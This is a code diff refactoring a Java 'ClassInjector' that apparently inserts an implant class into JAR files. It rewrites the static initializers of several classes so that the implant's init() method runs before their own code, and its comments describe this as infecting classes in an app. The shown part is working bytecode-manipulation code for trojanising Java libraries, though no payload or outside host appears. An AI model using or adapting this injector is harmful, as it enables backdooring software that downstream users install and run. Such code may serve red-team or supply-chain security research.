@@ -7,6 +7,7 @@ import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 import java.nio.file.Path;
 import java.util.Map;
+import java.util.Optional;
 import java.util.Set;
 import java.util.jar.JarEntry;
 import java.util.logging.Logger;
@@ -53,18 +54,18 @@ public class ClassInjector {
                      * Any directory will do and only one occurrence of the implant class in the JAR is enough.
                      */
                     ClassFile implant = implantHandler.loadFreshConfiguredSpecimen();
-                    deepRenameClass(implant, targetPackageName, IMPLANT_CLASS_NAME);
-                    ClassName newImplantName = ClassName.of(implant);
-                    JarEntry newJarEntry = new JarEntry(newImplantName.getClassFilePath());
+                    ClassFile renamedImplant = deepRenameClass(implant, targetPackageName, IMPLANT_CLASS_NAME);
+                    ClassName renamedImplantName = ClassName.of(renamedImplant);
+                    JarEntry newJarEntry = new JarEntry(renamedImplantName.getClassFilePath());
                     try {
-                        fiddler.addNewEntry(newJarEntry, asByteArray(implant));
+                        fiddler.addNewEntry(newJarEntry, asByteArray(renamedImplant));
                         log.info("Created implant class '" + newJarEntry.getName() + "'.");
                     } catch (ZipException e) {
                         log.warning("Implant class may already exists in package '" + targetPackageName + "'. Aborting.");
                         continue;   // TODO Signal these different endgames using exceptions instead
                     }
 
-                    implantedClass = implant;
+                    implantedClass = renamedImplant;
                 }
 
                 /*
@@ -75,12 +76,12 @@ public class ClassInjector {
                  * Several classes are infected because it's difficult to know what specific class will be used
                  * by an app.
                  */
-                boolean didModifyClinit = maybeModifyClinit(currentlyProcessing, implantedClass);
-                if (!didModifyClinit) {
+                Optional<ClassFile> modifiedClass = modifyClinit(currentlyProcessing, implantedClass);
+                if (modifiedClass.isEmpty()) {
                     // This class is too weird at the moment. Move on to the next one.
                     continue;
                 }
-                entry.replaceContentWith(asByteArray(currentlyProcessing));
+                entry.replaceContentWith(asByteArray(modifiedClass.get()));
                 countClinitModified++;
                 log.fine("Modified class initializer for '" + entry.getName() + "'.");
             }
@@ -132,43 +133,45 @@ public class ClassInjector {
      * This method will only modify the class initializer to invoke the implants <code>init</code> method.
      * The implant class itself must exist on the classpath later when an app uses the modified class.
      *
-     * @param targetClass  Target class to modify
+     * @param targetClass  Target class
      * @param implantClass The implant class
-     * @return true if it was successful, false otherwise
+     * @return A modified version of the targetClass if successful, empty otherwise
      */
-    static boolean maybeModifyClinit(ClassFile targetClass, ClassFile implantClass) {
+    static Optional<ClassFile> modifyClinit(ClassFile targetClass, ClassFile implantClass) {
+        ClassFile clone = cloneClassFile(targetClass);
+
         MethodInfo implantInitMethod = implantClass.getMethod("init");
         if (implantInitMethod == null) {
-            throw new UnsupportedOperationException("Implant class does not have a 'public static init()' function.");
+            throw new UnsupportedOperationException("Implant class does not have a 'public static void init()' function.");
         }
 
-        MethodInfo currentClinit = targetClass.getMethod(MethodInfo.nameClinit);
+        MethodInfo currentClinit = clone.getMethod(MethodInfo.nameClinit);
         if (currentClinit != null && containsInvokeOpcodes(currentClinit)) {
-            log.fine("Non-trivial <clinit> in '" + targetClass.getName() + "'. Skipping infection of this class.");
-            return false;
+            log.fine("Non-trivial <clinit> in '" + clone.getName() + "'. Skipping infection of this class.");
+            return Optional.empty();
         }
         if (currentClinit == null) {
             // The target does not already have a class initializer (aka <clinit>) to merge implant code into.
             // This is fine, but to make things a bit more streamlined, create an empty one first.
             try {
-                currentClinit = createAndAddClassInitializerStub(targetClass);
+                currentClinit = createAndAddClassInitializerStub(clone);
             } catch (DuplicateMemberException e) {
                 throw new RuntimeException("Internal error: <clinit> already exist despite not existing", e);
             }
         }
 
         // Modify the clinit method of the target class to run the implant method (before its own code)
-        Bytecode additionalClinitCode = new Bytecode(targetClass.getConstPool());
+        Bytecode additionalClinitCode = new Bytecode(clone.getConstPool());
         additionalClinitCode.addInvokestatic(implantClass.getName(), implantInitMethod.getName(), implantInitMethod.getDescriptor());
         CodeAttribute additionalClinitCodeAttr = additionalClinitCode.toCodeAttribute();
         CodeAttribute currentClinitCodeAttr = currentClinit.getCodeAttribute();
         ByteBuffer concatenatedCode = ByteBuffer.allocate(additionalClinitCodeAttr.getCodeLength() + currentClinit.getCodeAttribute().getCodeLength());
         concatenatedCode.put(additionalClinitCodeAttr.getCode());
         concatenatedCode.put(currentClinitCodeAttr.getCode());
-        CodeAttribute newCodeAttribute = new CodeAttribute(targetClass.getConstPool(), currentClinitCodeAttr.getMaxStack(), currentClinitCodeAttr.getMaxLocals(), concatenatedCode.array(), currentClinitCodeAttr.getExceptionTable());
+        CodeAttribute newCodeAttribute = new CodeAttribute(clone.getConstPool(), currentClinitCodeAttr.getMaxStack(), currentClinitCodeAttr.getMaxLocals(), concatenatedCode.array(), currentClinitCodeAttr.getExceptionTable());
         currentClinit.setCodeAttribute(newCodeAttribute);
 
-        return true;
+        return Optional.of(clone);
     }
 
     private static boolean containsInvokeOpcodes(MethodInfo clinit) {
@@ -198,8 +201,18 @@ public class ClassInjector {
         return false;
     }
 
-    // TODO This code is getting gnarly. Consider just stripping away debug info (for the implant class).
-    static void deepRenameClass(ClassFile classFile, String newPackageName, String newClassName) {
+    /**
+     * Rename every reference to the original class name with a new name.
+     * This will only consider debugging info.
+     *
+     * @param classFile      Target class
+     * @param newPackageName New package name
+     * @param newClassName   New class name
+     * @return A modified copy of the target class, or the same instance if it was not modified
+     */
+    static ClassFile deepRenameClass(ClassFile classFile, String newPackageName, String newClassName) {
+        ClassFile clone = cloneClassFile(classFile);
+
         // TODO Rewrite this using ClassName instead of Strings
         String newFqcn;
         if (newPackageName.isEmpty()) {
@@ -209,8 +222,7 @@ public class ClassInjector {
         }
         String newSourceFileName = newClassName + ".java";
 
-        boolean didChangeSomething = false;
-        AttributeInfo sourceFileAttr = classFile.getAttribute(SourceFileAttribute.tag);
+        AttributeInfo sourceFileAttr = clone.getAttribute(SourceFileAttribute.tag);
         if (sourceFileAttr != null) {
             ByteBuffer sourceFileInfo = ByteBuffer.wrap(sourceFileAttr.get());
             sourceFileInfo.order(ByteOrder.BIG_ENDIAN);
@@ -218,28 +230,28 @@ public class ClassInjector {
                 throw new RuntimeException("Unexpected SourceFileAttribute length: " + sourceFileInfo.limit());
             }
             int fileNameIndex = sourceFileInfo.getShort();
-            String fileName = classFile.getConstPool().getUtf8Info(fileNameIndex);
-            String expectedName = ClassName.of(classFile).getClassName();
+            String fileName = clone.getConstPool().getUtf8Info(fileNameIndex);
+            String expectedName = ClassName.of(clone).getClassName();
             if (!fileName.startsWith(expectedName)) {
                 throw new RuntimeException("Unexpected SourceFileAttribute: Expected class to start with '" + expectedName + "'.");
             }
             if (expectedName.equals(newClassName)) {
-                return; // Bad flow
+                // It already has this name. Don't do anything.
+                return classFile;
             }
-            int newClassNameIndex = classFile.getConstPool().addUtf8Info(newSourceFileName);
+            int newClassNameIndex = clone.getConstPool().addUtf8Info(newSourceFileName);
             if (newClassNameIndex < 0 || newClassNameIndex > 65535) {
                 throw new RuntimeException("Unexpected index in ConstPool: " + newClassNameIndex);
             }
             sourceFileInfo.flip();
             sourceFileInfo.putShort((short) newClassNameIndex);
             sourceFileAttr.set(sourceFileInfo.array());
-            didChangeSomething = true;
         }
 
-        classFile.setName(newFqcn);
-        if (didChangeSomething) {
-            // compact() removes any "dead" items from the ConstPool. This modifies the class byte data quite a lot.
-            classFile.compact();
-        }
+        clone.setName(newFqcn);
+        // compact() removes any "dead" items from the ConstPool. This modifies the class byte data quite a lot.
+        clone.compact();
+
+        return clone;
     }
 }
